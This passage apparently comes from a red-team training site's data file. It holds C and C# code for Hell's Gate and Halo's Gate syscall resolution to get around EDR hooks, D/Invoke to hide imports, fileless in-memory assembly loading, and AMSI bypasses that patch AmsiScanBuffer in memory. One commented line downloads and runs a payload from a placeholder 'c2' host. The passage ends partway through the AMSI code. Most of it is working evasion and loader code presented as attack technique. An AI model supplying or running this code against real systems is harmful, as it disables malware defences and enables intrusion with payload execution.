SYSCALL_ENTRY g_syscalls[256];
DWORD g_syscallCount = 0;

// Build syscall table
void BuildSyscallTable() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)
        ((BYTE*)hNtdll + pDos->e_lfanew);
    
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)
        ((BYTE*)hNtdll + pNt->OptionalHeader.DataDirectory[0].VirtualAddress);
    
    DWORD* pNames = (DWORD*)((BYTE*)hNtdll + pExport->AddressOfNames);
    DWORD* pFuncs = (DWORD*)((BYTE*)hNtdll + pExport->AddressOfFunctions);
    WORD* pOrds = (WORD*)((BYTE*)hNtdll + pExport->AddressOfNameOrdinals);
    
    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        char* szName = (char*)((BYTE*)hNtdll + pNames[i]);
        
        // Only interested in Nt* functions
        if (szName[0] != 'N' || szName[1] != 't') continue;
        
        BYTE* pFunc = (BYTE*)hNtdll + pFuncs[pOrds[i]];
        
        // Extract SSN
        if (pFunc[0] == 0x4C && pFunc[3] == 0xB8) {
            DWORD ssn = *(DWORD*)(pFunc + 4);
            
            strcpy_s(g_syscalls[g_syscallCount].name, 
                     sizeof(g_syscalls[0].name), szName);
            g_syscalls[g_syscallCount].ssn = ssn;
            g_syscallCount++;
        }
    }
    
    printf("[+] Built syscall table: %lu entries\\n", 
           g_syscallCount);
}

// Lookup SSN by name
DWORD LookupSSN(const char* szName) {
    for (DWORD i = 0; i < g_syscallCount; i++) {
        if (strcmp(g_syscalls[i].name, szName) == 0) {
            return g_syscalls[i].ssn;
        }
    }
    return 0;
}

int main() {
    BuildSyscallTable();
    
    DWORD ssn = LookupSSN("NtOpenProcess");
    printf("NtOpenProcess SSN: 0x%X\\n", ssn);
    
    // Use direct syscall here...
    
    return 0;
}`,
          language: "c"
        },
        {
          title: "3. Hell's Gate - Dynamic SSN Resolution",
          content: `Hell's Gate is a technique to dynamically find System Service Numbers even when functions are hooked. It handles both clean and hooked ntdll functions.

THE PROBLEM:
• SSNs change between Windows versions
• Hardcoding SSNs breaks on updates
• Hooked functions don't show SSN in expected place

HELL'S GATE SOLUTION:
1. Try to extract SSN from function directly
2. If hooked, search neighboring functions
3. Calculate SSN based on neighbors
4. SSNs are sequential: NtFunc1=0x18, NtFunc2=0x19, NtFunc3=0x1A

ALGORITHM:
• If function is clean, extract SSN
• If hooked, find closest clean function above/below
• Calculate based on distance

EXAMPLE:
NtOpenProcess (hooked) = ???
NtOpenProcessToken (clean) = SSN 0x123
Distance = 1 function
NtOpenProcess SSN = 0x123 - 1 = 0x122`,
          code: `#include <windows.h>
#include <stdio.h>

#define UP   -32
#define DOWN  32

// Check if function is hooked
BOOL IsHooked(BYTE* pFunc) {
    // Expected pattern: 4C 8B D1 B8
    if (pFunc[0] == 0x4C &&
        pFunc[1] == 0x8B &&
        pFunc[2] == 0xD1 &&
        pFunc[3] == 0xB8) {
        return FALSE;  // Clean
    }
    
    return TRUE;  // Hooked
}

// Extract SSN from clean function
DWORD ExtractSSN(BYTE* pFunc) {
    if (pFunc[3] == 0xB8) {
        return *(DWORD*)(pFunc + 4);
    }
    return 0;
}

// Hell's Gate: Get SSN even if hooked
DWORD HellsGate(const char* szFunction) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    BYTE* pFunc = (BYTE*)GetProcAddress(hNtdll, szFunction);
    
    if (pFunc == NULL) {
        printf("[-] Function not found\\n");
        return 0;
    }
    
    // Check if function is clean
    if (!IsHooked(pFunc)) {
        DWORD ssn = ExtractSSN(pFunc);
        printf("[+] %s is clean, SSN: 0x%X\\n", 
               szFunction, ssn);
        return ssn;
    }
    
    printf("[!] %s is HOOKED, searching neighbors...\\n", 
           szFunction);
    
    // Function is hooked, search neighbors
    // Try searching down first
    for (int i = 1; i < DOWN; i++) {
        BYTE* pNeighbor = pFunc + (i * 0x20);
        
        // Check if valid memory
        if (IsBadReadPtr(pNeighbor, 8)) continue;
        
        if (!IsHooked(pNeighbor)) {
            DWORD neighborSSN = ExtractSSN(pNeighbor);
            DWORD calculatedSSN = neighborSSN - i;
            
            printf("[+] Found clean neighbor at +%d\\n", i);
            printf("[+] Neighbor SSN: 0x%X\\n", neighborSSN);
            printf("[+] Calculated SSN: 0x%X\\n", calculatedSSN);
            
            return calculatedSSN;
        }
    }
    
    // Try searching up
    for (int i = 1; i < -UP; i++) {
        BYTE* pNeighbor = pFunc - (i * 0x20);
        
        if (IsBadReadPtr(pNeighbor, 8)) continue;
        
        if (!IsHooked(pNeighbor)) {
            DWORD neighborSSN = ExtractSSN(pNeighbor);
            DWORD calculatedSSN = neighborSSN + i;
            
            printf("[+] Found clean neighbor at -%d\\n", i);
            printf("[+] Neighbor SSN: 0x%X\\n", neighborSSN);
            printf("[+] Calculated SSN: 0x%X\\n", calculatedSSN);
            
            return calculatedSSN;
        }
    }
    
    printf("[-] Could not resolve SSN\\n");
    return 0;
}

// Halo's Gate: More sophisticated neighbor search
DWORD HalosGate(const char* szFunction) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    BYTE* pFunc = (BYTE*)GetProcAddress(hNtdll, szFunction);
    
    if (pFunc == NULL) return 0;
    
    // If clean, return directly
    if (!IsHooked(pFunc)) {
        return ExtractSSN(pFunc);
    }
    
    // Hooked - use algorithm to find SSN
    // Parse export table to find function index
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)
        ((BYTE*)hNtdll + pDos->e_lfanew);
    
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)
        ((BYTE*)hNtdll + 
         pNt->OptionalHeader.DataDirectory[0].VirtualAddress);
    
    DWORD* pNames = (DWORD*)((BYTE*)hNtdll + 
                             pExport->AddressOfNames);
    DWORD* pFuncs = (DWORD*)((BYTE*)hNtdll + 
                             pExport->AddressOfFunctions);
    WORD* pOrds = (WORD*)((BYTE*)hNtdll + 
                          pExport->AddressOfNameOrdinals);
    
    // Find function index
    DWORD funcIndex = 0;
    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        char* szName = (char*)((BYTE*)hNtdll + pNames[i]);
        if (strcmp(szName, szFunction) == 0) {
            funcIndex = i;
            break;
        }
    }
    
    // Search up and down for clean functions
    for (int offset = 1; offset < 50; offset++) {
        // Try down
        if (funcIndex + offset < pExport->NumberOfNames) {
            BYTE* pDown = (BYTE*)hNtdll + 
                          pFuncs[pOrds[funcIndex + offset]];
            
            if (!IsHooked(pDown)) {
                DWORD ssnDown = ExtractSSN(pDown);
                return ssnDown - offset;
            }
        }
        
        // Try up
        if (funcIndex >= offset) {
            BYTE* pUp = (BYTE*)hNtdll + 
                        pFuncs[pOrds[funcIndex - offset]];
            
            if (!IsHooked(pUp)) {
                DWORD ssnUp = ExtractSSN(pUp);
                return ssnUp + offset;
            }
        }
    }
    
    return 0;
}

int main() {
    printf("=== Hell's Gate Demo ===\\n\\n");
    
    const char* funcs[] = {
        "NtOpenProcess",
        "NtReadVirtualMemory",
        "NtWriteVirtualMemory",
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory"
    };
    
    for (int i = 0; i < 5; i++) {
        printf("\\n--- %s ---\\n", funcs[i]);
        DWORD ssn = HellsGate(funcs[i]);
        
        if (ssn != 0) {
            printf("[+] Final SSN: 0x%X\\n", ssn);
        } else {
            printf("[-] Failed to get SSN\\n");
        }
    }
    
    return 0;
}`,
          language: "c"
        }
      ]
    },
    pinvoke: {
      title: "P/Invoke & .NET Interop",
      sections: [
        {
          title: "1. P/Invoke Fundamentals - Calling Unmanaged Code from C#",
          content: `Platform Invoke (P/Invoke) is the .NET mechanism to call unmanaged Win32 APIs from managed C# code. It's the bridge between safe managed code and native Windows APIs.

WHY P/INVOKE:
• Access Win32 APIs not wrapped in .NET
• Call custom native DLLs
• Interop with legacy C/C++ code
• Red team: Call Native API functions directly

HOW IT WORKS:
1. Declare external function with [DllImport]
2. CLR loads target DLL
3. Marshals parameters (managed → native)
4. Calls native function
5. Marshals return value (native → managed)

MARSHALING:
Converting between managed and unmanaged types:
• int → int (simple)
• string → char*/wchar_t* (complex)
• struct → C struct (layout matters!)
• IntPtr → void* (raw pointer)

COMMON ATTRIBUTES:
• DllImport - Specifies DLL and function
• MarshalAs - Controls type marshaling
• StructLayout - Controls struct memory layout
• In/Out - Parameter direction`,
          code: `using System;
using System.Runtime.InteropServices;

class Win32API {
    // EXAMPLE 1: Simple P/Invoke
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    public static extern int MessageBoxW(
        IntPtr hWnd,
        string lpText,
        string lpCaption,
        uint uType
    );
    
    public static void SimpleExample() {
        MessageBoxW(IntPtr.Zero,
                   "Hello from C#!",
                   "P/Invoke Demo",
                   0);  // MB_OK
    }
    
    // EXAMPLE 2: Process functions
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(
        uint dwDesiredAccess,
        bool bInheritHandle,
        uint dwProcessId
    );
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int nSize,
        out int lpNumberOfBytesRead
    );
    
    public static void ProcessMemoryExample() {
        const uint PROCESS_VM_READ = 0x0010;
        
        // Open process
        IntPtr hProcess = OpenProcess(
            PROCESS_VM_READ,
            false,
            1234  // PID
        );
        
        if (hProcess == IntPtr.Zero) {
            int error = Marshal.GetLastWin32Error();
            Console.WriteLine($"OpenProcess failed: {error}");
            return;
        }
        
        Console.WriteLine($"Opened process: {hProcess}");
        
        // Read memory
        byte[] buffer = new byte[256];
        int bytesRead;
        
        bool success = ReadProcessMemory(
            hProcess,
            (IntPtr)0x400000,
            buffer,
            buffer.Length,
            out bytesRead
        );
        
        if (success) {
            Console.WriteLine($"Read {bytesRead} bytes");
            Console.WriteLine(BitConverter.ToString(buffer, 0, 16));
        }
        
        CloseHandle(hProcess);
    }
    
    // EXAMPLE 3: Structures
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_BASIC_INFORMATION {
        public IntPtr Reserved1;
        public IntPtr PebBaseAddress;
        public IntPtr Reserved2_1;
        public IntPtr Reserved2_2;
        public IntPtr UniqueProcessId;
        public IntPtr Reserved3;
    }
    
    [DllImport("ntdll.dll")]
    public static extern int NtQueryInformationProcess(
        IntPtr ProcessHandle,
        int ProcessInformationClass,
        out PROCESS_BASIC_INFORMATION ProcessInformation,
        int ProcessInformationLength,
        out int ReturnLength
    );
    
    public static void StructExample() {
        const uint PROCESS_QUERY_INFORMATION = 0x0400;
        
        IntPtr hProcess = OpenProcess(
            PROCESS_QUERY_INFORMATION,
            false,
            (uint)System.Diagnostics.Process.GetCurrentProcess().Id
        );
        
        PROCESS_BASIC_INFORMATION pbi;
        int returnLength;
        
        int status = NtQueryInformationProcess(
            hProcess,
            0,  // ProcessBasicInformation
            out pbi,
            Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)),
            out returnLength
        );
        
        if (status == 0) {
            Console.WriteLine($"PID: {pbi.UniqueProcessId}");
            Console.WriteLine($"PEB: {pbi.PebBaseAddress:X}");
        }
        
        CloseHandle(hProcess);
    }
    
    // EXAMPLE 4: Callbacks
    public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
    
    [DllImport("user32.dll")]
    public static extern bool EnumWindows(
        EnumWindowsProc lpEnumFunc,
        IntPtr lParam
    );
    
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    public static extern int GetWindowText(
        IntPtr hWnd,
        StringBuilder lpString,
        int nMaxCount
    );
    
    public static void CallbackExample() {
        EnumWindows((hWnd, lParam) => {
            StringBuilder sb = new StringBuilder(256);
            GetWindowText(hWnd, sb, 256);
            
            string title = sb.ToString();
            if (!string.IsNullOrEmpty(title)) {
                Console.WriteLine($"Window: {title}");
            }
            
            return true;  // Continue enumeration
        }, IntPtr.Zero);
    }
    
    // EXAMPLE 5: Error handling
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibraryW(
        [MarshalAs(UnmanagedType.LPWStr)] string lpFileName
    );
    
    public static void ErrorHandlingExample() {
        IntPtr hModule = LoadLibraryW("nonexistent.dll");
        
        if (hModule == IntPtr.Zero) {
            // Get detailed error
            int error = Marshal.GetLastWin32Error();
            string message = new System.ComponentModel.Win32Exception(error).Message;
            
            Console.WriteLine($"LoadLibrary failed:");
            Console.WriteLine($"  Error code: {error}");
            Console.WriteLine($"  Message: {message}");
        }
    }
}

class Program {
    static void Main() {
        Console.WriteLine("=== P/Invoke Examples ===\\n");
        
        Console.WriteLine("1. Simple MessageBox");
        Win32API.SimpleExample();
        
        Console.WriteLine("\\n2. Process Memory");
        Win32API.ProcessMemoryExample();
        
        Console.WriteLine("\\n3. Structures");
        Win32API.StructExample();
        
        Console.WriteLine("\\n4. Callbacks");
        Win32API.CallbackExample();
        
        Console.WriteLine("\\n5. Error Handling");
        Win32API.ErrorHandlingExample();
    }
}`,
          language: "csharp"
        },
        {
          title: "2. D/Invoke - Dynamic API Resolution",
          content: `D/Invoke (Dynamic Invoke) is a more advanced technique that resolves API functions at runtime instead of compile-time. This bypasses static analysis and makes code more flexible.

WHY D/INVOKE:
• APIs resolved at runtime (no static imports)
• Harder to detect via static analysis
• Can resolve Native API (ntdll) functions
• Bypass Import Address Table (IAT) monitoring

HOW IT WORKS:
1. Use GetModuleHandle to get DLL base
2. Parse PE headers to find exports
3. Find target function by name
4. Get function address
5. Marshal to delegate and call

VS P/INVOKE:
• P/Invoke: Compile-time binding, in IAT
• D/Invoke: Runtime binding, no IAT entry

BENEFITS FOR EVASION:
• No suspicious imports in executable
• Can use obfuscated function names
• Runtime API selection`,
          code: `using System;
using System.Runtime.InteropServices;

class DInvoke {
    // Get module base address
    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    // Get function address
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetProcAddress(
        IntPtr hModule,
        string procName
    );
    
    // Generic API resolution
    public static T GetAPI<T>(string dllName, string functionName)
        where T : Delegate {
        
        // Get DLL base
        IntPtr hModule = GetModuleHandle(dllName);
        
        if (hModule == IntPtr.Zero) {
            throw new Exception($"Module {dllName} not found");
        }
        
        // Get function address
        IntPtr pFunction = GetProcAddress(hModule, functionName);
        
        if (pFunction == IntPtr.Zero) {
            throw new Exception($"Function {functionName} not found");
        }
        
        // Marshal to delegate
        return (T)Marshal.GetDelegateForFunctionPointer(
            pFunction, typeof(T));
    }
    
    // EXAMPLE 1: Dynamic MessageBox
    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
    public delegate int MessageBoxW_Delegate(
        IntPtr hWnd,
        string lpText,
        string lpCaption,
        uint uType
    );
    
    public static void MessageBoxExample() {
        // Resolve at runtime
        var MessageBoxW = GetAPI<MessageBoxW_Delegate>(
            "user32.dll", "MessageBoxW");
        
        // Call it
        MessageBoxW(IntPtr.Zero,
                   "Dynamically resolved!",
                   "D/Invoke",
                   0);
    }
    
    // EXAMPLE 2: Native API (ntdll)
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate int NtOpenProcess_Delegate(
        out IntPtr ProcessHandle,
        uint DesiredAccess,
        ref OBJECT_ATTRIBUTES ObjectAttributes,
        ref CLIENT_ID ClientId
    );
    
    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }
    
    public static void NativeAPIExample() {
        // Resolve NtOpenProcess from ntdll
        var NtOpenProcess = GetAPI<NtOpenProcess_Delegate>(
            "ntdll.dll", "NtOpenProcess");
        
        IntPtr hProcess;
        OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES {
            Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES))
        };
        
        CLIENT_ID cid = new CLIENT_ID {
            UniqueProcess = (IntPtr)1234  // PID
        };
        
        int status = NtOpenProcess(
            out hProcess,
            0x1000,  // PROCESS_QUERY_LIMITED_INFORMATION
            ref oa,
            ref cid
        );
        
        if (status == 0) {
            Console.WriteLine($"NtOpenProcess succeeded: {hProcess}");
            
            // Close handle
            var NtClose = GetAPI<NtClose_Delegate>(
                "ntdll.dll", "NtClose");
            NtClose(hProcess);
        }
    }
    
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate int NtClose_Delegate(IntPtr Handle);
    
    // EXAMPLE 3: Manual PE parsing for exports
    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_DOS_HEADER {
        public ushort e_magic;
        // ... other fields ...
        public int e_lfanew;
    }
    
    [StructLayout(LayoutKind.Explicit)]
    public struct IMAGE_NT_HEADERS64 {
        [FieldOffset(0)]
        public uint Signature;
        [FieldOffset(4)]
        public IMAGE_FILE_HEADER FileHeader;
        [FieldOffset(24)]
        public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_FILE_HEADER {
        public ushort Machine;
        public ushort NumberOfSections;
        public uint TimeDateStamp;
        public uint PointerToSymbolTable;
        public uint NumberOfSymbols;
        public ushort SizeOfOptionalHeader;
        public ushort Characteristics;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_OPTIONAL_HEADER64 {
        public ushort Magic;
        // ... many fields ...
        [FieldOffset(112)]
        public IMAGE_DATA_DIRECTORY ExportTable;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_DATA_DIRECTORY {
        public uint VirtualAddress;
        public uint Size;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_EXPORT_DIRECTORY {
        public uint Characteristics;
        public uint TimeDateStamp;
        public ushort MajorVersion;
        public ushort MinorVersion;
        public uint Name;
        public uint Base;
        public uint NumberOfFunctions;
        public uint NumberOfNames;
        public uint AddressOfFunctions;
        public uint AddressOfNames;
        public uint AddressOfNameOrdinals;
    }
    
    // Manual export resolution (no GetProcAddress!)
    public static IntPtr GetExportAddress(IntPtr moduleBase, string functionName) {
        // This is a simplified version
        // Full implementation would parse PE completely
        
        IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)
            Marshal.PtrToStructure(moduleBase, typeof(IMAGE_DOS_HEADER));
        
        IntPtr ntHeadersPtr = IntPtr.Add(moduleBase, dosHeader.e_lfanew);
        IMAGE_NT_HEADERS64 ntHeaders = (IMAGE_NT_HEADERS64)
            Marshal.PtrToStructure(ntHeadersPtr, typeof(IMAGE_NT_HEADERS64));
        
        IntPtr exportDirPtr = IntPtr.Add(
            moduleBase,
            (int)ntHeaders.OptionalHeader.ExportTable.VirtualAddress
        );
        
        IMAGE_EXPORT_DIRECTORY exportDir = (IMAGE_EXPORT_DIRECTORY)
            Marshal.PtrToStructure(exportDirPtr, typeof(IMAGE_EXPORT_DIRECTORY));
        
        // Search for function by name
        IntPtr namesPtr = IntPtr.Add(moduleBase, (int)exportDir.AddressOfNames);
        IntPtr functionsPtr = IntPtr.Add(moduleBase, (int)exportDir.AddressOfFunctions);
        IntPtr ordinalsPtr = IntPtr.Add(moduleBase, (int)exportDir.AddressOfNameOrdinals);
        
        for (int i = 0; i < exportDir.NumberOfNames; i++) {
            int nameRva = Marshal.ReadInt32(
                IntPtr.Add(namesPtr, i * 4));
            IntPtr namePtr = IntPtr.Add(moduleBase, nameRva);
            string name = Marshal.PtrToStringAnsi(namePtr);
            
            if (name == functionName) {
                short ordinal = Marshal.ReadInt16(
                    IntPtr.Add(ordinalsPtr, i * 2));
                int funcRva = Marshal.ReadInt32(
                    IntPtr.Add(functionsPtr, ordinal * 4));
                
                return IntPtr.Add(moduleBase, funcRva);
            }
        }
        
        return IntPtr.Zero;
    }
}

class Program {
    static void Main() {
        Console.WriteLine("=== D/Invoke Examples ===\\n");
        
        Console.WriteLine("1. Dynamic MessageBox");
        DInvoke.MessageBoxExample();
        
        Console.WriteLine("\\n2. Native API");
        DInvoke.NativeAPIExample();
    }
}`,
          language: "csharp"
        },
        {
          title: "3. In-Memory Assembly Execution - Fileless Attacks",
          content: `In-memory assembly execution loads and runs .NET assemblies directly from memory without touching disk. This is a powerful technique for evasion and red team operations.

WHY IN-MEMORY:
• No files written to disk (fileless)
• Bypasses file-based AV scanning
• No forensic artifacts on filesystem
• Can download and execute remotely

TECHNIQUES:
• Assembly.Load() - Load from byte array
• AppDomain.CreateInstanceFrom() - Isolated execution
• Reflection - Call methods dynamically

TYPICAL FLOW:
1. Download assembly bytes (HTTP/DNS/etc.)
2. Load into memory with Assembly.Load()
3. Find entry point or target method
4. Invoke with reflection
5. Execute in current process

SECURITY:
• Modern EDRs monitor Assembly.Load()
• AMSI scans loaded assemblies
• ETW logs assembly loads
• Need evasion techniques`,
          code: `using System;
using System.Reflection;
using System.IO;
using System.Net;

class InMemoryExecution {
    // EXAMPLE 1: Load and execute assembly
    public static void LoadAndExecute(byte[] assemblyBytes) {
        try {
            // Load assembly from bytes
            Assembly asm = Assembly.Load(assemblyBytes);
            
            Console.WriteLine($"[+] Loaded: {asm.FullName}");
            
            // Find entry point
            MethodInfo entryPoint = asm.EntryPoint;
            
            if (entryPoint != null) {
                Console.WriteLine($"[+] Entry point: {entryPoint.Name}");
                
                // Invoke with no parameters
                object result = entryPoint.Invoke(null, null);
                
                Console.WriteLine($"[+] Execution complete");
            } else {
                Console.WriteLine("[-] No entry point found");
            }
        } catch (Exception ex) {
            Console.WriteLine($"[-] Error: {ex.Message}");
        }
    }
    
    // EXAMPLE 2: Invoke specific method
    public static void InvokeMethod(byte[] assemblyBytes,
                                    string typeName,
                                    string methodName,
                                    object[] parameters) {
        try {
            Assembly asm = Assembly.Load(assemblyBytes);
            
            // Find type
            Type type = asm.GetType(typeName);
            if (type == null) {
                Console.WriteLine($"[-] Type {typeName} not found");
                return;
            }
            
            // Find method
            MethodInfo method = type.GetMethod(
                methodName,
                BindingFlags.Public | BindingFlags.Static
            );
            
            if (method == null) {
                Console.WriteLine($"[-] Method {methodName} not found");
                return;
            }
            
            // Invoke
            object result = method.Invoke(null, parameters);
            
            Console.WriteLine($"[+] Method invoked, result: {result}");
        } catch (Exception ex) {
            Console.WriteLine($"[-] Error: {ex.Message}");
        }
    }
    
    // EXAMPLE 3: Download and execute
    public static void DownloadAndExecute(string url) {
        try {
            Console.WriteLine($"[*] Downloading from: {url}");
            
            using (WebClient client = new WebClient()) {
                byte[] assemblyBytes = client.DownloadData(url);
                
                Console.WriteLine($"[+] Downloaded {assemblyBytes.Length} bytes");
                
                LoadAndExecute(assemblyBytes);
            }
        } catch (Exception ex) {
            Console.WriteLine($"[-] Error: {ex.Message}");
        }
    }
    
    // EXAMPLE 4: Execute in new AppDomain (isolation)
    public static void ExecuteInAppDomain(byte[] assemblyBytes) {
        AppDomain domain = null;
        
        try {
            // Create isolated AppDomain
            AppDomainSetup setup = new AppDomainSetup {
                ApplicationBase = AppDomain.CurrentDomain.BaseDirectory
            };
            
            domain = AppDomain.CreateDomain(
                "IsolatedDomain",
                null,
                setup
            );
            
            Console.WriteLine("[+] Created AppDomain");
            
            // Load and execute in isolated domain
            domain.Load(assemblyBytes);
            
            Console.WriteLine("[+] Loaded in isolated domain");
            
            // Execute...
            
        } catch (Exception ex) {
            Console.WriteLine($"[-] Error: {ex.Message}");
        } finally {
            if (domain != null) {
                AppDomain.Unload(domain);
                Console.WriteLine("[+] AppDomain unloaded");
            }
        }
    }
    
    // EXAMPLE 5: List all types in assembly
    public static void InspectAssembly(byte[] assemblyBytes) {
        Assembly asm = Assembly.Load(assemblyBytes);
        
        Console.WriteLine($"Assembly: {asm.FullName}\\n");
        
        Type[] types = asm.GetTypes();
        Console.WriteLine($"Types: {types.Length}\\n");
        
        foreach (Type type in types) {
            Console.WriteLine($"Type: {type.FullName}");
            
            // List public methods
            MethodInfo[] methods = type.GetMethods(
                BindingFlags.Public | 
                BindingFlags.Static |
                BindingFlags.Instance
            );
            
            foreach (MethodInfo method in methods) {
                Console.WriteLine($"  - {method.Name}");
            }
            
            Console.WriteLine();
        }
    }
    
    // EXAMPLE 6: Execute with parameters
    public static void ExecuteWithArgs(byte[] assemblyBytes, string[] args) {
        Assembly asm = Assembly.Load(assemblyBytes);
        MethodInfo entryPoint = asm.EntryPoint;
        
        if (entryPoint != null) {
            // Main method takes string[] args
            ParameterInfo[] parameters = entryPoint.GetParameters();
            
            if (parameters.Length == 1 && 
                parameters[0].ParameterType == typeof(string[])) {
                
                // Invoke with args
                entryPoint.Invoke(null, new object[] { args });
            } else {
                // No parameters
                entryPoint.Invoke(null, null);
            }
        }
    }
}

// Example payload assembly
/*
// Compile this as a separate DLL:
using System;

namespace Payload {
    public class Program {
        public static void Main(string[] args) {
            Console.WriteLine("Payload executed!");
            Console.WriteLine($"Args: {string.Join(", ", args)}");
        }
        
        public static string GetInfo() {
            return "This is a payload method";
        }
    }
}
*/

class Program {
    static void Main() {
        // Example: Load payload from file
        byte[] payload = File.ReadAllBytes("payload.dll");
        
        Console.WriteLine("=== In-Memory Execution ===\\n");
        
        Console.WriteLine("1. Simple execution");
        InMemoryExecution.LoadAndExecute(payload);
        
        Console.WriteLine("\\n2. Invoke specific method");
        InMemoryExecution.InvokeMethod(
            payload,
            "Payload.Program",
            "GetInfo",
            null
        );
        
        Console.WriteLine("\\n3. Inspect assembly");
        InMemoryExecution.InspectAssembly(payload);
        
        // In real scenario:
        // InMemoryExecution.DownloadAndExecute("http://c2/payload.dll");
    }
}`,
          language: "csharp"
        }
      ]
    },
    evasion: {
      title: "Evasion Techniques",
      sections: [
        {
          title: "1. AMSI Bypass - Defeating PowerShell Protection",
          content: `AMSI (Antimalware Scan Interface) is Microsoft's API that allows antivirus to scan script content before execution. Every PowerShell command and .NET assembly load is scanned by AMSI.

HOW AMSI WORKS:
1. PowerShell/Script executes command
2. AMSI intercepts content
3. Sends to registered AV/EDR
4. AV scans and returns verdict
5. If malicious, execution blocked

BYPASS TECHNIQUES:
• Patch amsi.dll in memory (AmsiScanBuffer)
• Force AMSI initialization to fail
• Unhook AMSI from PowerShell
• Memory patching from C#

THE PATCH:
AmsiScanBuffer returns AMSI_RESULT_CLEAN when patched:
• Original: Full function code
• Patched: return AMSI_RESULT_CLEAN (0)

DETECTION:
• Modern EDRs monitor VirtualProtect on amsi.dll
• ETW logs AMSI bypass attempts
• Memory scanning detects patches
• Need multi-layer evasion`,
          code: `using System;
using System.Runtime.InteropServices;

class AMSIBypass {
    // Win32 API imports
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(
        IntPtr hModule,
        string procName
    );
    
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect
    );
    
    // Memory protection constants
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    
    // TECHNIQUE 1: Patch AmsiScanBuffer
    public static bool PatchAmsiScanBuffer() {
        try {
            // Get amsi.dll base
            IntPtr hAmsi = GetModuleHandle("amsi.dll");
            if (hAmsi == IntPtr.Zero) {
                Console.WriteLine("[-] amsi.dll not loaded");
                return false;
            }
            
            // Get AmsiScanBuffer address
            IntPtr pAmsiScanBuffer = GetProcAddress(
                hAmsi, "AmsiScanBuffer");
            
            if (pAmsiScanBuffer == IntPtr.Zero) {
                Console.WriteLine("[-] AmsiScanBuffer not found");
                return false;
            }
            
            Console.WriteLine($"[+] AmsiScanBuffer at: {pAmsiScanBuffer:X}");
            
            // Change protection to RWX
            uint oldProtect;
            if (!VirtualProtect(pAmsiScanBuffer, 
                               (UIntPtr)6, 
                               PAGE_EXECUTE_READWRITE, 
                               out oldProtect)) {
                Console.WriteLine("[-] VirtualProtect failed");
                return false;
            }
            
            // Patch with: xor eax, eax; ret
            // Makes function always return AMSI_RESULT_CLEAN
            byte[] patch = {
                0x31, 0xC0,  // xor eax, eax
                0xC3         // ret
            };
            
            Marshal.Copy(patch, 0, pAmsiScanBuffer, patch.Length);
            
            Console.WriteLine("[+] AMSI patched successfully!");
            
            // Restore original protection
            VirtualProtect(pAmsiScanBuffer,
                          (UIntPtr)6,
                          oldProtect,
                          out oldProtect);
            
            return true;
        } catch (Exception ex) {
            Console.WriteLine($"[-] Error: {ex.Message}");
            return false;
        }
    }
    
    // TECHNIQUE 2: Patch AmsiOpenSession
    public static bool PatchAmsiOpenSession() {
        try {
            IntPtr hAmsi = GetModuleHandle("amsi.dll");
            if (hAmsi == IntPtr.Zero) return false;
            
            IntPtr pAmsiOpenSession = GetProcAddress(
                hAmsi, "AmsiOpenSession");
            
            if (pAmsiOpenSession == IntPtr.Zero) return false;
            
            Console.WriteLine($"[+] AmsiOpenSession at: {pAmsiOpenSession:X}");
            
            uint oldProtect;
            VirtualProtect(pAmsiOpenSession,
                          (UIntPtr)3,
                          PAGE_EXECUTE_READWRITE,
                          out oldProtect);
            
